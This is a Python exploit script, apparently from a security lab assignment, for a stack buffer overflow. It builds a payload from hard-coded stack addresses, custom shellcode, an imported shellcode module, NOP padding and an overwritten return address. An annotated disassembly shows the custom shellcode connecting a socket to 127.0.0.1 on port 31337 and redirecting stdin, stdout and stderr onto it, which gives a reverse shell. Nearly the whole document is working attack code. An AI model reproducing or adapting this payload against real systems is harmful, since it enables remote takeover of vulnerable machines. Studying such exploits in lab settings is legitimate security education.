from shellcode import shellcode
from struct import pack

# EBP = 0xbffef238

ret_address = 0xbffef23c  # EBP + 4
buf_address = 0xbffeea28

# 0x08048ef8 <+24>:	lea    -0x810(%ebp),%eax
# so buf_address: EBP - 0x810 = 0xbffeea28

my_sc_code = '\x31\xc0' + '\xb0\x66' + '\x31\xdb' + '\xb3\x01' + '\x31\xc9' + \
'\x51' + '\x83\xc1\x01' + '\x51' + '\x83\xc1\x01' + '\x51' +'\x89\xe1' + \
'\x31\xd2' +'\xcd\x80' + '\x89\xc6'+ '\x31\xc9' + '\x66\x81\xc1\x00\x01' + \
'\xc1\xe1\x10' + '\x80\xc1\x7f' + '\x51' + '\x66\x68\x7a\x69' + '\x31\xdb' + \
'\xb3\x02' + '\x66\x53' + '\x89\xe7' + '\x6a\x10' + '\x57' + '\x56' + \
'\x31\xc0' + '\xb0\x66' + '\x31\xdb' + '\xb3\x03' + '\x89\xe1' + '\xcd\x80' + \
'\x31\xc0' + '\xb0\x3f' + '\x89\xf3' + '\x31\xc9' + '\xcd\x80' + '\xb0\x3f' + \
'\x83\xc1\x01' + '\xcd\x80' + '\xb0\x3f' + '\x83\xc1\x01' + '\xcd\x80'

# print len(shellcode)
# print len(my_sc_code)

print my_sc_code + shellcode + '\x90'*1933 + pack("<I",buf_address) + pack("<I",ret_address)


## Annotated disassembly:

"""
# Use socketcall(int call, unsigned long *args) to call socket()
# Resolve I/O redirection for stdin/stdout/stderr using dup2()

# SOCK_STREAM = 1
# AF_INET = 2

# place call number into %eax
xor %eax, %eax
mov $102, %al

# for socket() call (call number is 1 --> SYS_SOCKET)
xor %ebx, %ebx
mov $1, %bl

# init args for socket(int domain, int type, int protocol)
# domain = 2 (AF_INET) type=1 (SOCK_STREAM), protocol= 0
xor %ecx, %ecx
push %ecx
add $1, %ecx
push %ecx
add $1, %ecx
push %ecx
mov %esp, %ecx

xor %edx, %edx

int $0x80

# save socket
mov %eax, %esi

# init for connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
# 127.0.0.1 => 0x0100007f

xor %ecx, %ecx
add $0x0100, %cx
shl $16, %ecx
add $0x7f, %cl
push %ecx

# port = 31337
pushw $0x697a

# AF_INET = 2
xor %ebx, %ebx
mov $2, %bl
push %bx

mov %esp, %edi

pushl $16
push %edi
push %esi
xor %eax, %eax
mov $102, %al
xor %ebx, %ebx
mov $3, %bl
mov %esp, %ecx

int $0x80

# handle io with dup2(int oldfd, int newfd)
# stdin: 0, stdout: 1, stderr: 2
xor %eax, %eax
mov $063, %al
mov %esi, %ebx

xor %ecx, %ecx
int $0x80

mov $63, %al
add $1, %ecx
int $0x80

mov $63, %al
add $1, %ecx
int $0x80
"""
